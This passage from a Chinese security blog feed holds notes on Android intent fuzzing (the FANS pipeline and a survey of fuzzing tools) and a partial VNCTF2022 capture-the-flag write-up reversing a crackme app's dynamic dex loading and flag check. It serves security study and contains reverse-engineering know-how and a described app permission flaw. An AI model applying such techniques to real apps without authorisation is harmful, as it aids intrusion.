clone</p><p>python2，安装python2或者退出anaconda的base环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 可能需要安装以下库文件</span></span><br><span class="line">sudo apt-get install libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib</span><br><span class="line">sudo apt-get install -y git flex bison gperf build-essential libncurses5-dev:i386</span><br><span class="line">sudo apt-get install tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line">sudo apt-get install dpkg-dev libsdl1.2-dev libesd0-dev</span><br><span class="line">sudo apt-get install git-core gnupg flex bison gperf build-essential</span><br><span class="line">sudo apt-get install zip curl zlib1g-dev gcc-multilib g++-multilib</span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br><span class="line">sudo apt-get install lib32ncurses5-dev x11proto-core-dev libx11-dev</span><br><span class="line">sudo apt-get install libgl1-mesa-dev libxml2-utils xsltproc unzip m4</span><br><span class="line">sudo apt-get install lib32z-dev ccache</span><br><span class="line">sudo apt-get install libssl-dev</span><br><span class="line">sudo apt-get install libxml2-dev libxml2-doc</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 我觉得日志最后输出这些就算编译好了</span></span><br><span class="line"><span class="meta">[100%</span><span class="bash"> 73879/73879] /bin/bash -c <span class="string">&quot;(export SGDISK=out/host/linux-x86/bin/sgdisk; device/generic/goldfish/tools/mk_qemu_image.sh out/target/product/generic/system.img)&quot;</span></span></span><br><span class="line">1+0 records in</span><br><span class="line">2048+0 records out</span><br><span class="line">1048576 bytes (1.0 MB, 1.0 MiB) copied, 0.00850228 s, 123 MB/s</span><br><span class="line">1536+0 records in</span><br><span class="line">1536+0 records out</span><br><span class="line">1610612736 bytes (1.6 GB, 1.5 GiB) copied, 1.41226 s, 1.1 GB/s</span><br><span class="line">1048576+0 records in</span><br><span class="line">1048576+0 records out</span><br><span class="line">1048576 bytes (1.0 MB, 1.0 MiB) copied, 0.977471 s, 1.1 MB/s</span><br><span class="line">Creating new GPT entries.</span><br><span class="line">Warning: The kernel is still using the old partition table.</span><br><span class="line">The new table will be used at the next reboot.</span><br><span class="line">The operation has completed successfully.</span><br><span class="line">Setting name!</span><br><span class="line">partNum is 0</span><br><span class="line">REALLY setting name!</span><br><span class="line">Warning: The kernel is still using the old partition table.</span><br><span class="line">The new table will be used at the next reboot.</span><br><span class="line">The operation has completed successfully.</span><br><span class="line"></span><br><span class="line">[0;32m#### build completed successfully (28:52 (mm:ss)) ####[00m</span><br></pre></td></tr></table></figure><p>搜索相关教程，把Android Pie的编译流程走一遍。由命令<code>make -j [N_PROCS] showcommands 2&gt;&amp;1 &gt;cmd.txt</code>，得到cmd.txt保存编译命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 一行编译命令如下</span></span><br><span class="line">[ 89% 65753/73879] /bin/bash -c &quot;(rm -f out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.dynsyms out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.funcsyms out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.keep_symbols out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.debug out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo.xz ) &amp;&amp; (if prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-strip --strip-all -R .comment out/target/product/generic/symbols/system/lib/vndk-28/libstagefright_omx.so -o out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so; then prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-objcopy --only-keep-debug out/target/product/generic/symbols/system/lib/vndk-28/libstagefright_omx.so out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.debug &amp;&amp; prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-nm -D out/target/product/generic/symbols/system/lib/vndk-28/libstagefright_omx.so --format=posix --defined-only | awk &#x27;&#123; print \$1 &#125;&#x27; | sort &gt;out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.dynsyms &amp;&amp; prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-nm out/target/product/generic/symbols/system/lib/vndk-28/libstagefright_omx.so --format=posix --defined-only | awk &#x27;&#123; if (\$2 == \&quot;T\&quot; || \$2 == \&quot;t\&quot; || \$2 == \&quot;D\&quot;) print \$1 &#125;&#x27; | sort &gt;out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.funcsyms &amp;&amp; comm -13 out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.dynsyms out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.funcsyms &gt;out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.keep_symbols &amp;&amp; echo &gt;&gt;out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.keep_symbols &amp;&amp; prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-objcopy --rename-section .debug_frame=saved_debug_frame out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.debug out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo &amp;&amp; prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-objcopy -S --remove-section .gdb_index --remove-section .comment --keep-symbols=out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.keep_symbols out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo &amp;&amp; prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-objcopy --rename-section saved_debug_frame=.debug_frame out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo &amp;&amp; rm -f out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo.xz &amp;&amp; xz out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo &amp;&amp; prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin/arm-linux-androideabi-objcopy --add-section .gnu_debugdata=out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so.mini_debuginfo.xz out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so; else cp -f out/target/product/generic/symbols/system/lib/vndk-28/libstagefright_omx.so out/target/product/generic/obj/SHARED_LIBRARIES/libstagefright_omx.vendor_intermediates/libstagefright_omx.vendor.so; fi )&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-Service-Related-File-Collector"><a href="#1-Service-Related-File-Collector" class="headerlink" title="1 Service Related File Collector"></a>1 Service Related File Collector</h3><p>旨在收集与Android native system service相关的文件，具体来说，与以下主体相关：</p><ol><li>top-level &amp; multi-level interface</li><li>标准的parcel、flattenable、lightFlattenable结构体</li><li>接收parcel类参数的函数</li><li>不使用readFromParcel&amp;writeToParcel的特殊parcel结构体</li></ol><p>大致流程如下：</p><ol><li>FANS分析<code>cmd.txt</code>文件，提取AOSP编译过程中涉及到的cpp/cc文件，缩小搜索范围，同时排除特定目录下的文件和hardware相关的代码文件</li><li>枚举文件每一行代码，根据<code>status_t xxxxx::onTransact(</code>的模式确定包含的interface，将interface和当前文件file关联</li><li>如果代码包含interface，那显然是interface-related</li><li>如果代码中有<code>readFromParcel</code>、<code>writeToParcel</code>、<code>flatten</code>、<code>unflatten</code>关键字，说明可能与interface交互，也是interface-related的</li><li>如果代码中有包含<code>misc_parcel_related_function</code>或者<code>special_parcelable_function</code>，也视作是interface_related的</li><li>最后输出两个文件，记录interface与所在文件路径的json格式文件[interface2file.json]，记录所有interface-related file的文件[service_related_file.txt]。</li></ol><h3 id="2-Interface-Model-Extractor"><a href="#2-Interface-Model-Extractor" class="headerlink" title="2 Interface Model Extractor"></a>2 Interface Model Extractor</h3><h4 id="2-1-Pre-Procees"><a href="#2-1-Pre-Procees" class="headerlink" title="2.1 Pre-Procees"></a>2.1 Pre-Procees</h4><p>根据readme.md，似乎得先把llvm以及clang-6.0配置好再运行<code>gen_all_related_cc1_cmd.py</code>。</p><p><code>gen_all_related_cc1_cmd.py</code>又把cmd.txt拿出来分析，把AOSP编译过程中涉及到clang编译的命令记录筛选出来。（”-v 2&gt;&amp;1”，把错误输出也定向到标准输出），然后把结果保存为json，键值关系是&lt;filepath,cmd_result&gt;。</p><p><code>extract_from_ast.py</code>把前一步得到的cmd_result拿出来，把<code>aosp_clang_location</code>替换为<code>manually_build_clang_location</code>，同时修改了一些其他的编译配置，然后去执行编译一遍。最后检查命令行的输出结果，确保编译顺利完成。</p><p>考虑到在上述两者之间，我们还手动编译了BinderIface，需要搞懂它的作用。这里面涉及到了一些AST的东西。<br>同时需要注意的是，整个pre-process的工作都还是只提取interface/service related information，真正的处理还是得看post-process。</p><p><strong>BinderIface</strong></p><p>VisitTypedefDecl()： 似乎是记录编译目标cpp/cc时，涉及到的变量类型的alias和type，将其保存在typemap&lt;underlyingType, qualifiedName&gt;中。<br>暂时姑且认为BinderIface已经完成了对interface的AST操作。</p><p><strong>Corner Case</strong><br>在部分代码中，switch case语句并没有按照一定格式优雅地编写，需要手动调整这一小部分代码，便于后续处理。具体的细节在<code>pre-process/misc.md</code>中。</p><h4 id="2-2-post-process"><a href="#2-2-post-process" class="headerlink" title="2.2 post-process"></a>2.2 post-process</h4><p><strong>init.sh</strong></p><p>重置一些目录和文件，然后调用init.py。处理一下pre-process中收集到的underlyingType与qualifiedName。<br>简单来说就是借用并查集操作，把各级别名与对应的基本类型直接关联起来。<br>从文件操作上来看，读入<code>rough_interface_related_data_dir/typemap.txt</code>，输出<code>interface_model_extractor_dir/simplified_typemap_file.txt</code>。</p><h2 id="现有的Intent-Fuzzer类工具"><a href="#现有的Intent-Fuzzer类工具" class="headerlink" title="现有的Intent-Fuzzer类工具"></a>现有的Intent-Fuzzer类工具</h2><h3 id="开源-Null-IntentFuzzer"><a href="#开源-Null-IntentFuzzer" class="headerlink" title="[开源] Null IntentFuzzer"></a>[开源] Null IntentFuzzer</h3><p>它以Android app的形式，安装到设备中然后选择并提取目标app的相关信息，然后进行fuzz。<br>它的逻辑非常迫真，就是直接向目标组件发送空的intent然后测试app的反应，可能在非常早期的Android时代是有用的。</p><p>这个项目原本是iSECpartner做的，但是他们现在组织架构发生了变化，暂时没有找到最官方的版本。目前在GitHub上面找到了两个复刻版本，它们都是基于isecpartner的思路来构建的，那么就先研究以下这两个项目的代码。</p><p><a href="https://github.com/MindMac/IntentFuzzer">https://github.com/MindMac/IntentFuzzer</a><br><a href="https://github.com/Fuzion24/AndroidIntentFuzzer">https://github.com/Fuzion24/AndroidIntentFuzzer</a></p><h3 id="开源-hwacha"><a href="#开源-hwacha" class="headerlink" title="[开源] hwacha"></a>[开源] hwacha</h3><p><a href="http://swlab.jnu.ac.kr/paper/hwacha.html">http://swlab.jnu.ac.kr/paper/hwacha.html</a></p><p>韩国人开发的intent fuzz，代码可用，支持GUI和cmd两种操作模式，支持单个app测试和app批量测试，支持基于模板的测试用例生成，提供了50个app的benchmark数据集，包括测试结果的日志。</p><h3 id="droidFuzzer"><a href="#droidFuzzer" class="headerlink" title="droidFuzzer"></a>droidFuzzer</h3><p>没有开源，详细介绍见前文，主要使用构造恶意的MIME格式数据来进行fuzz，测试对象多为音频视频播放软件。<br>它同时也是一篇中科大硕士学位论文，可以参考的学位论文这一版来详细学习内部设计。</p><h3 id="flowdroid"><a href="#flowdroid" class="headerlink" title="flowdroid"></a>flowdroid</h3><p>flowdroid是一款非常流行的Android apk静态污点分析工具，虽然自2014年发布以来其核心算法没有发生变化，但是该项目一直都在维护，并且提供了benchmark，是不少研究的对照组。</p><p>与毕业设计的研究方向并不一致，目前也没有必要使用它的技术，但是以后应该需要考虑。</p><h3 id="IntentFuzzer"><a href="#IntentFuzzer" class="headerlink" title="IntentFuzzer"></a>IntentFuzzer</h3><p>IntentFuzzer结合了静态分析(flowdroid)和随机测试用例生成技术来fuzz应用，同时还使用了路径无关的进程间控制流程图分析技术来提取每个组件所接受的intent的具体结构，也使用了flowdroid来进行静态分析获取更为准确的intent结构信息。</p><p>但是没有开源</p><h3 id="INTENTDROID"><a href="#INTENTDROID" class="headerlink" title="INTENTDROID"></a>INTENTDROID</h3><p>IBM的员工开发，但是没有开源</p><h3 id="ComDroid"><a href="#ComDroid" class="headerlink" title="ComDroid"></a>ComDroid</h3><h3 id="FuzzerDroid"><a href="#FuzzerDroid" class="headerlink" title="FuzzerDroid"></a>FuzzerDroid</h3><p>flowdroid作者亲自设计，亲自编写。</p><p>看起来是个定向fuzz，还可以生成运行环境。</p><p><a href="https://github.com/srasthofer/FuzzDroid">https://github.com/srasthofer/FuzzDroid</a></p><h3 id="IntentFuzzer-by-tsinghua"><a href="#IntentFuzzer-by-tsinghua" class="headerlink" title="IntentFuzzer by tsinghua"></a>IntentFuzzer by tsinghua</h3><p>ASIA CCS 2014</p><p>主要是做capibility leak，目标是Started Service和Broadcast Receviers。</p><p>在系统中安装代理应用proxy，然后发送intent给目标app，检查是否能够触发app使用一定的权限。</p><p>基于drozer开发</p><p>fuzz出来许多漏洞并进行了原理叙述。</p><p>例如小米的后台清理服务，它以一个后台服务的形式的存在，本来应该做好权限声明，只能被应用内部的intent触发，但是这里可以响应外部intent，所以可以导致任意杀掉后台进程。</p><h3 id="开源-Drozer"><a href="#开源-Drozer" class="headerlink" title="[开源] Drozer"></a>[开源] Drozer</h3><p><a href="https://labs.f-secure.com/tools/drozer/">https://labs.f-secure.com/tools/drozer/</a></p><p>一个Android安全测试框架，考虑用于进行apk的信息提取和组件信息的探测。</p><p>  [14]  Rawat, S., Jain, V., Kumar, A., Cojocar, L., Giuffrida, C., &amp; Bos, H.  (2017, February). VUzzer: Application-aware Evolutionary Fuzzing. In NDSS  (Vol. 17, pp. 1-14).  [15]  Chen, P., &amp; Chen, H. (2018, May). Angora: Efficient fuzzing by principled  search. In 2018 IEEE Symposium on Security and Privacy (SP) (pp. 711-725). IEEE.  [16]  Wang, J., Chen, B., Wei, L., &amp; Liu, Y. (2017, May). Skyfire: Data-driven  seed generation for fuzzing. In 2017 IEEE Symposium on Security and Privacy  (SP) (pp. 579-594). IEEE.Chen, P., &amp; Chen, H. (2018, May). Angora:  Efficient fuzzing by principled search. In 2018 IEEE Symposium on Security  and Privacy (SP) (pp. 711-725). IEEE.  [17]  Böhme, M., Pham, V. T., Nguyen, M. D., &amp; Roychoudhury, A. (2017,  October). Directed greybox fuzzing. In Proceedings of the 2017 ACM SIGSAC  Conference on Computer and Communications Security (pp. 2329-2344).  [18]  Chen, H., Xue, Y., Li, Y., Chen, B., Xie, X., Wu, X., &amp; Liu, Y. (2018,  October). Hawkeye: Towards a desired directed grey-box fuzzer. In Proceedings  of the 2018 ACM SIGSAC Conference on Computer and Communications Security  (pp. 2095-2108).  [19]  Gan, S., Zhang, C., Qin, X., Tu, X., Li, K., Pei, Z., &amp; Chen, Z. (2018,  May). Collafl: Path sensitive fuzzing. In 2018 IEEE Symposium on Security and  Privacy (SP) (pp. 679-696). IEEE.  [20]  Lemieux, C., &amp; Sen, K. (2018, September). Fairfuzz: A targeted mutation  strategy for increasing greybox fuzz testing coverage. In Proceedings of the  33rd ACM/IEEE International Conference on Automated Software Engineering (pp.  475-485).  [21]  Maji, A. K., Arshad, F. A., Bagchi, S., &amp; Rellermeyer, J. S. (2012,  June). An empirical study of the robustness of inter-component communication  in Android. In IEEE/IFIP International Conference on Dependable Systems and  Networks (DSN 2012) (pp. 1-12). IEEE.  [22]  Ye, H., Cheng, S., Zhang, L., &amp; Jiang, F. (2013, December). Droidfuzzer:  Fuzzing the android apps with intent-filter tag. In Proceedings of  International Conference on Advances in Mobile Computing &amp; Multimedia  (pp. 68-74).  [23]  R. Hay, O. Tripp, and M. Pistoia, “Dynamic detection of inter-application  communication vulnerabilities in Android,” in Proc. of Proceedings of the  2015 International Symposium on Software Testing and Analysis - ISSTA 2015,  pp. 118–128, July 13-17, 2015.  </p><p>[24] R. Sasnauskas and J. Regehr, “Intent fuzzer: crafting intents of death,” in Proc. of the 2014 Joint Int’l Workshop on Dynamic Analysis and Software and System Performance Testing, Debugging, and Analytics - WODA+PERTEA 2014, pp. 1–5, July 22, 2014.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Android Intent Fuzz类论文阅读笔记，以及相关工具、代码和介绍&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2022 Android cm1.apk</title>
    <link href="http://slient2009.github.io/2022/02/13/Android-Reverse-2/"/>
    <id>http://slient2009.github.io/2022/02/13/Android-Reverse-2/</id>
    <published>2022-02-13T05:00:00.000Z</published>
    <updated>2022-02-12T13:33:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>只有一个Android，我也就只做了个Android，题目链接: <a href="https://buuoj.cn/match/matches/81/challenges">https://buuoj.cn/match/matches/81/challenges</a></p><span id="more"></span><p>首先定位到<code>com.vnctf2022.cm1.MainActivity</code>，发现里面并没有特别的地方，如果安装运行并配合反编译代码，可以很快明白起始这里就是实现了个进度条和反馈收集功能，真正的逻辑在<code>com.vnctf2022.cm1.Main</code>中。</p><p>具体到<code>com.vnctf2022.cm1.Main.init_widget() </code>中，程序先获取了输入然后调用check函数来检查，check()函数中直接去加载了一个dex文件来获取了一个<code>newCls2Check</code>对象进行具体的校验。dex动态加载逻辑在loadDexClass()中，对应的dex文件就是asset目录下的<code>ooo</code>文件。虽然这里有native层的操作，但是都是无关紧要的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.vnctf2022.cm1.Main</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">check</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        IHeihei newCls2check = <span class="keyword">this</span>.loadDexClass();</span><br><span class="line">        <span class="keyword">if</span>(newCls2check == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;errrrrrrrorrrr what are you doing!!!!!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newCls2check.hcheck(input).booleanValue() ? Boolean.valueOf(<span class="keyword">true</span>) : Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init_widget</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.btn1 = (Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070023</span>);  <span class="comment">// id:btn1</span></span><br><span class="line">        <span class="keyword">this</span>.txt1 = (TextView)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070094</span>);  <span class="comment">// id:txt1</span></span><br><span class="line">        <span class="keyword">this</span>.edit1 = (EditText)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070039</span>);  <span class="comment">// id:edit1</span></span><br><span class="line">        <span class="keyword">this</span>.txt1.setText(<span class="keyword">this</span>.stringFromJNI2());</span><br><span class="line">        <span class="keyword">this</span>.btn1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg3)</span> </span>&#123;</span><br><span class="line">                String input = Main.<span class="keyword">this</span>.edit1.getText().toString();</span><br><span class="line">                Main.<span class="keyword">this</span>.txt1.setText(input);</span><br><span class="line">                <span class="keyword">if</span>(Main.<span class="keyword">this</span>.check(input).booleanValue()) &#123;</span><br><span class="line">                    Toast.makeText(Main.<span class="keyword">this</span>.getBaseContext(), <span class="string">&quot;you are right~&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(Main.<span class="keyword">this</span>.getBaseContext(), <span class="string">&quot;Wrong!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> IHeihei <span class="title">loadDexClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File v0 = <span class="keyword">this</span>.getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        String dexPath = v0.getAbsolutePath() + File.separator + <span class="string">&quot;classes.dex&quot;</span>;</span><br><span class="line">        File dexFile = <span class="keyword">new</span> File(dexPath);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(!dexFile.exists()) &#123;</span><br><span class="line">                dexFile.createNewFile();</span><br><span class="line">                FileUtils.copyFiles(<span class="keyword">this</span>, <span class="string">&quot;ooo&quot;</span>, dexFile);<span class="comment">// 这里的copyFile是自己实现的，并不是直接复制</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IOException v2_1) &#123;</span><br><span class="line">            v2_1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DexClassLoader v2_2 = <span class="keyword">new</span> DexClassLoader(dexPath, v0.getAbsolutePath(), <span class="keyword">null</span>, <span class="keyword">this</span>.getClassLoader());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IHeihei clsInstance = (IHeihei)v2_2.loadClass(<span class="string">&quot;com.vnctf2022.cm1.Haha&quot;</span>).newInstance();</span><br><span class="line">            <span class="keyword">if</span>(clsInstance != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clsInstance;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.e(<span class="string">&quot;Mz1&quot;</span>, <span class="string">&quot; --- loaderr&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0_1) &#123;</span><br><span class="line">            v0_1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>FileUtils.copyFiles</code>是程序自己实现的，包含了一定的解密逻辑，所以直接用jeb来反编译<code>ooo</code>文件是行不通的。一种简单的办法就是把安装apk并运行，然后直接去目录下面找到对应的<code>classes.dex</code>文件来分析即可。</p><p>分析<code>classes.dex</code>，其中<code>com.vnctf2022.cm1.Haha</code>类包含了相关的校验逻辑，整个校验逻辑稍微复杂了一些，但是耐心梳理还是可以理清的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// classes.dex com.vnctf2022.cm1.Haha</span></span><br><span class="line"><span class="keyword">package</span> com.vnctf2022.cm1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Haha</span> <span class="keyword">implements</span> <span class="title">IHeihei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Haha</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="string">&quot;flag&#123;fake_flag_again&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 